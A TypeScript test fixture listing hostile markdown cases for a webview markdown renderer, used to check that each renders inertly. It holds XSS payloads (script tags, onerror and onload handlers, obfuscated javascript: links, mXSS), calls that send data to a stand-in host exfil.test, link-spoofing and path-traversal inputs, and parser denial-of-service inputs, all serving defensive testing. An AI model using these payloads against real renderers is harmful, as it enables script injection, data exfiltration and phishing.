// The hostile corpus, from the G4 bake-off: the webview security research's list plus G4's own. Each case
// renders in its own container, so a failure names the case. Payloads call window.__g4pwn(<case>) if they
// ever run. One home: these tests (hostile.test.tsx, in happy-dom) and the private real-browser harness
// (Chromium, WebKitGTK, WebView2, WKWebView) import this same file. The cases for the inline-tag allowlist
// and the syntax extras live in hostile-tags-fixture.ts and are appended here.
import { TAG_CASES } from "./hostile-tags-fixture.ts";

export type HostileCase = {
  id: string;
  markdown: string;
  /** Literal text that must show in the rendered text (raw HTML shows as text). */
  text?: string[];
  /**
   * The literal text that must show mid-stream once it has arrived, when not all of `text` must: tail
   * repair hides a `[` with no `]` after it yet (a link's text still arriving), so brackets show once
   * their `]` arrives or the answer is finished.
   */
  streamingText?: string[];
  /** Exact number of real <img> elements the case renders. Default 0. */
  images?: number;
  /** A link-host hint the link component must show (link-text spoofing). */
  linkHost?: string;
  /** How many elements each selector matches in the finished render (the allowlisted tags, by name). */
  tags?: Record<string, number>;
  /** The characters each streamed delta adds; 16 when unset (1 shows every split of a tag). */
  delta?: number;
};

const PNG_1PX =
  "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==";
const SVG_ONLOAD =
  "data:image/svg+xml;base64," +
  btoa(`<svg xmlns="http://www.w3.org/2000/svg" onload="parent.__g4pwn('data-svg')"/>`);
const DATA_HTML =
  "data:text/html;base64," + btoa("<script>parent.__g4pwn('data-html-link')</script>");
const LONG_LINE = "**clause** _term_ `code` [ref](https://a.example/x) ~~old~~ <b>x</b> "
  .repeat(300)
  .slice(0, 20_000);
/** An ordinary answer's section: a heading, a paragraph with emphasis and code, and a list. */
const SECTION = (n: number) =>
  `## Clause ${n}\n\nThe party shall *notify* the other within \`${n}\` days of the **event**.\n\n- first duty\n- second duty\n\n`;
/** SECTIONs `from` to `to`, numbered from 1: 450 of them are 52 KB. */
const sections = (from: number, to: number) =>
  Array.from({ length: to - from + 1 }, (_, index) => SECTION(from + index)).join("");

export const CASES: HostileCase[] = [
  {
    id: "raw-script",
    markdown: `Before <script>window.__g4pwn("raw-script")</script> after.`,
    text: ["<script>"],
  },
  {
    id: "raw-script-block",
    markdown: `<script>\nwindow.__g4pwn("raw-script-block")\n</script>`,
    text: ["<script>"],
  },
  {
    id: "img-onerror",
    markdown: `<img src=x onerror="window.__g4pwn('img-onerror')">`,
    text: ["onerror"],
  },
  {
    id: "svg-onload",
    markdown: `<svg onload="window.__g4pwn('svg-onload')"><circle r="4"/></svg>`,
    text: ["<svg"],
  },
  {
    id: "iframe",
    markdown: `<iframe src="https://exfil.test/frame" srcdoc="<script>parent.__g4pwn('iframe')</script>"></iframe>`,
    text: ["<iframe"],
  },
  {
    id: "raw-anchor-js",
    markdown: `<a href="javascript:window.__g4pwn('raw-anchor-js')">click</a>`,
    text: ["<a href"],
  },
  { id: "js-link", markdown: `[click me](javascript:window.__g4pwn('js-link'))` },
  {
    id: "js-link-mixed-case",
    markdown: `[click](JaVaScRiPt:window.__g4pwn('js-link-mixed-case'))`,
  },
  { id: "js-link-entity", markdown: `[click](&#106;avascript:window.__g4pwn('js-link-entity'))` },
  { id: "js-autolink", markdown: `<javascript:window.__g4pwn('js-autolink')>` },
  { id: "vbscript-link", markdown: `[open](vbscript:msgbox("x"))` },
  { id: "data-html-link", markdown: `[document](${DATA_HTML})` },
  {
    id: "file-link",
    markdown: `[calc](file:///C:/Windows/System32/calc.exe) and [share](\\\\\\\\attacker\\\\share)`,
  },
  { id: "remote-image", markdown: `![secret](https://exfil.test/?q=secret)` },
  { id: "remote-image-http", markdown: `![pixel](http://exfil.test/pixel.gif "title")` },
  {
    id: "image-in-js-link",
    markdown: `[![badge](https://exfil.test/badge.png)](javascript:window.__g4pwn('image-in-js-link'))`,
  },
  { id: "data-svg-image", markdown: `![svg](${SVG_ONLOAD})` },
  {
    id: "allowed-images",
    markdown: `![dot](${PNG_1PX}) and ![exhibit](clauseo-file:exhibit-4471)`,
    images: 2,
  },
  {
    id: "dom-clobber",
    markdown: `<a id="__g4clobber" name="__g4clobber">x</a> <form id="__g4clobber"><input name="attributes"></form>\n\nA claim[^__g4clobber].\n\n[^__g4clobber]: The note.`,
    text: ["<form"],
  },
  {
    id: "link-spoof",
    markdown: `[https://bank.example.com/login](https://evil.example.net/login)`,
    linkHost: "evil.example.net",
  },
  {
    id: "plain-links",
    markdown: `www.exfil.test/path, https://ok.example.com/ and <mailto:counsel@example.com>`,
  },
  {
    id: "mxss",
    markdown: `<math><mtext><table><mglyph><style><img src=x onerror="window.__g4pwn('mxss')">\n\n<noscript><p title="</noscript><img src=x onerror=window.__g4pwn('mxss-noscript')>">`,
    text: ["<math>", "<noscript>"],
  },
  {
    id: "style-injection",
    markdown: `<style>body{background:url(https://exfil.test/css)}</style>`,
    text: ["<style>"],
  },
  {
    id: "link-meta",
    markdown: `<link rel="dns-prefetch" href="https://exfil.test"><meta http-equiv="refresh" content="0;url=https://exfil.test">`,
    text: ["<link", "<meta"],
  },
  {
    id: "bidi",
    markdown: "Open invoice\u202Etxt.exe now; zero\u200Bwidth and \u2066isolate\u2069.",
  },
  {
    id: "code-with-html",
    markdown: "```html\n<script>window.__g4pwn('code-with-html')</script>\n```",
  },
  { id: "long-line", markdown: LONG_LINE, text: ["<b>"] },
  { id: "unterminated-fence", markdown: "```python\nimport os\nos.system('echo unterminated')\n" },
  // Added after G4, from PR #107's security review.
  {
    // micromark's browser entity decoder used innerHTML, which Trusted Types refuses (the root unmounted).
    id: "named-entities",
    markdown: "AT&amp;T and &copy; 2026; &nbsp;&mdash;&hellip; &lt;b&gt;not bold&lt;/b&gt;",
    text: ["AT&T", "© 2026", "—…", "<b>not bold</b>"],
  },
  // Nesting that overflowed the stack and unmounted the answer: capped at 32 levels, the rest as text.
  // Link text that hid its host from the spoof hint behind markup, invisible characters, case or punctuation.
  {
    id: "link-spoof-strong",
    markdown: "[**bank.example.com**](https://evil.example.net/login)",
    linkHost: "evil.example.net",
  },
  {
    id: "link-spoof-code",
    markdown: "[`bank.example.com`](https://evil.example.net/login)",
    linkHost: "evil.example.net",
  },
  {
    id: "link-spoof-zero-width",
    markdown: "[bank.example.com\u200b](https://evil.example.net/login)",
    linkHost: "evil.example.net",
  },
  {
    id: "link-spoof-case-dot",
    markdown: "[Bank.Example.Com.](https://evil.example.net/login)",
    linkHost: "evil.example.net",
  },
  // A host anywhere in the text, with ideographic full stops (round 2).
  {
    id: "link-spoof-in-text",
    markdown: "[🔒 Visit bank\u3002example\u3002com (official) ↗](https://evil.example.net/login)",
    linkHost: "evil.example.net",
  },
  // Files are opaque ids (decision 0001), never paths.
  { id: "file-path-image", markdown: "![passwd](clauseo-file:../../etc/passwd)" },
  // Tail repair once stripped a half-arrived tag while streaming, hiding everything after it.
  {
    id: "half-tag-mid-stream",
    markdown: "Note: if a<b then the clause continues",
    text: ["a<b then the clause continues"],
  },
  {
    id: "open-tag-mid-stream",
    markdown: '<div class="a"\nmore text after it',
    text: ['<div class="a"', "more text after it"],
  },
  { id: "deep-list", markdown: "- ".repeat(1000) + "x", text: ["- - - x"] },
  { id: "deep-quote", markdown: "> ".repeat(3000) + "x", text: ["> > > x"] },
  // Nesting built through indentation, which no line's markers show: 36 lines of 32 markers, each line
  // indented 16 tabs more (10 KB). It got past the marker cap, and micromark took seconds to parse it.
  {
    id: "tab-nesting",
    markdown: Array.from(
      { length: 36 },
      (_, line) => `${"\t".repeat(16 * line)}${"- ".repeat(32)}x${line}\n`,
    ).join(""),
    text: ["- - - x35"],
  },
  // Long delimiter runs, and many short ones: micromark's emphasis matching is quadratic in them (1.4 s
  // and 0.56 s to parse these); past the limits the rest is text.
  {
    id: "long-delimiter-runs",
    markdown: "*".repeat(5000) + "a" + "*".repeat(5000),
    text: ["***a***"],
  },
  { id: "delimiter-sequences", markdown: "a* ".repeat(5000), text: ["a* a* a*"] },
  // Fence languages named after Object's own properties: once found Object itself in the alias table,
  // which made the colouring worker's postMessage throw and turned colouring off for the page.
  {
    id: "fence-object-property-names",
    markdown: "```constructor\nfirst\n```\n\n```__proto__\nsecond\n```\n\n```toString\nthird\n```",
    text: ["first", "second", "third"],
  },
  // The same with `~` (strikethrough): 0.4 to 0.56 s to parse before `~` was capped.
  { id: "tilde-sequences", markdown: "a~ ".repeat(5000), text: ["a~ a~ a~"] },
  // Link and image brackets open at once: micromark took 1.9 s, 4.2 s and 1.0 s to parse these; past
  // 32 open in a paragraph a `[` is text.
  {
    id: "nested-image-brackets",
    markdown: "![".repeat(1000) + "a" + "](u)".repeat(1000),
    text: ["![![![", "](u)](u)"],
    streamingText: ["](u)](u)"],
  },
  {
    id: "nested-link-brackets",
    markdown: "[".repeat(5000) + "a" + "](u)".repeat(5000),
    text: ["[[[[a", "](u)](u)"],
  },
  {
    id: "open-link-brackets",
    markdown: "[a".repeat(5000) + "]".repeat(5000),
    text: ["[a[a[a"],
    streamingText: [],
  },
  // Brackets in code spans do not count towards that limit, but a backtick that micromark reads as part of
  // raw HTML must not hide thousands of them.
  {
    id: "code-span-hidden-brackets",
    markdown: '<a title="`">' + "[".repeat(5000) + "a" + "](u)".repeat(5000) + "`",
    text: ["[[[[a", "](u)](u)"],
  },
  // Character references in link destinations, before and after the full entity table loads (entities.ts):
  // `&colon;` and `&Tab;` are not in the common set, so they decode only once the table arrives, and the
  // link must stay inert in both states. `&sol;` moves the host from after `@` to before it on arrival.
  {
    id: "entity-colon-link",
    markdown: "[click](javascript&colon;window.__g4pwn('entity-colon-link'))",
  },
  {
    id: "entity-tab-colon-link",
    markdown: "[click](java&Tab;script&colon;window.__g4pwn('entity-tab-colon-link'))",
  },
  {
    id: "entity-colon-definition",
    markdown: "[click][d]\n\n[d]: javascript&colon;window.__g4pwn('entity-colon-definition')\n",
  },
  {
    id: "entity-colon-autolink",
    markdown: "<javascript&colon;window.__g4pwn('entity-colon-autolink')>",
  },
  {
    id: "entity-sol-host",
    markdown: "[bank.example](https://evil.example&sol;@bank.example/login)",
  },
  // Tail repair once closed every open emphasis at once (micromark took 2 s on the repaired `*a `×2,000,
  // 11.7 s an update at ×4,000) and scanned to the end of the block for each `[` (2.1 s an update).
  { id: "open-star-runs", markdown: "x " + "*a ".repeat(4000) },
  { id: "open-underscore-runs", markdown: "_a ".repeat(4000) },
  { id: "open-brackets", markdown: "[".repeat(16_000) },
  // Footnotes. Each label a block calls but does not define costs micromark a placeholder definition, and
  // each note is a block and a view: 1,000 labels in one paragraph (past MAX_PENDING while streaming),
  // 15 notes, the longest label, 8,000 `[^` and a chain of notes that each cite the next. Each note is a
  // block parsed on its own (about 0.2 ms in Node), so many notes cost about 5 times prose of their length
  // and 300 about 8.5 times (see the PR); these stay under the time test's 20 ms floor with room to spare
  // when the whole suite runs in parallel.
  {
    id: "footnote-many-labels",
    markdown: Array.from({ length: 1000 }, (_, index) => `[^n${index}]`).join(" "),
  },
  {
    id: "footnote-many-notes",
    markdown:
      Array.from({ length: 15 }, (_, index) => `Claim ${index}[^n${index}].`).join(" ") +
      "\n\n" +
      Array.from({ length: 15 }, (_, index) => `[^n${index}]: Note ${index}.`).join("\n\n"),
  },
  {
    id: "footnote-long-label",
    markdown: `See[^${"a".repeat(999)}].\n\n[^${"a".repeat(999)}]: Long.`,
  },
  { id: "footnote-unclosed", markdown: "[^".repeat(8000) },
  {
    id: "footnote-chain",
    markdown:
      "Start[^n0].\n\n" +
      Array.from({ length: 25 }, (_, index) => `[^n${index}]: Then[^n${index + 1}].`).join("\n\n"),
  },
  // A note gets a block's protections (round 1 of PR #115's review): what nesting.ts cut reads as
  // written (a long signature line, brackets, tildes), a list nested past the limit is cut after a
  // definition's label as after a list marker, and the 3,000-deep one with no reference stays fast.
  {
    id: "footnote-signature",
    markdown: `Signed[^s].\n\n[^s]: Signature: ${"_".repeat(70)}`,
    text: ["_".repeat(70)],
  },
  {
    id: "footnote-brackets-tildes",
    markdown: `See[^b].\n\n[^b]: ${"[".repeat(40)}a${"]".repeat(40)} and ${"~".repeat(70)}`,
    text: [`${"[".repeat(40)}a${"]".repeat(40)}`, "~".repeat(70)],
  },
  { id: "footnote-deep-list", markdown: `x[^a]\n\n[^a]: ${"- ".repeat(1000)}x`, text: ["- - - x"] },
  { id: "footnote-deeper-list", markdown: `[^a]: ${"- ".repeat(3000)}` },
  // Every streamed answer starts empty; #115 made the streaming render of "" throw.
  { id: "empty", markdown: "" },
  // An HTML block of kinds 1 to 5 runs on to its end marker across blank lines: left open, it took in
  // the rest of the answer, as raw text in one block parsed whole on every update (nesting.ts).
  {
    id: "html-block-unclosed",
    markdown: `<!-- the agent's note, never closed\n\n${sections(1, 225)}<pre>\n\n${sections(226, 450)}`,
    text: ["<!-- the agent's note", "<pre>"],
    tags: { h2: 450, ul: 450, strong: 450 },
  },
  ...TAG_CASES,
];
